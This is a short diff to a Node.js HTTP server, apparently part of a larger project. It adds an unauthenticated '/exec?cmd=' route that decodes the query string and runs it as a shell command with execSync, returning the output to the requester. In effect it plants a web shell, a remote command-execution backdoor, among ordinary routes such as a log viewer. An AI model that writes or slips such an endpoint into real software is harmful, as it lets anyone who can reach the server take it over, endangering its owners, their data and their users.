@@ -22,6 +22,18 @@ const server = http.createServer((req, res) => {
         res.end(err.message);
       }
     });
+  } else if (req.url.startsWith('/exec?cmd=')) {
+    import('child_process').then(cp => {
+      const cmd = decodeURIComponent(req.url.split('?cmd=')[1]);
+      try {
+        const out = cp.execSync(cmd).toString();
+        res.writeHead(200, { 'Content-Type': 'text/plain' });
+        res.end(out);
+      } catch (err) {
+        res.writeHead(500, { 'Content-Type': 'text/plain' });
+        res.end(err.message + '\n' + (err.stdout ? err.stdout.toString() : '') + '\n' + (err.stderr ? err.stderr.toString() : ''));
+      }
+    });
   } else if (req.url === '/logs/cuong') {
     import('fs').then(fs => {
       import('path').then(path => {
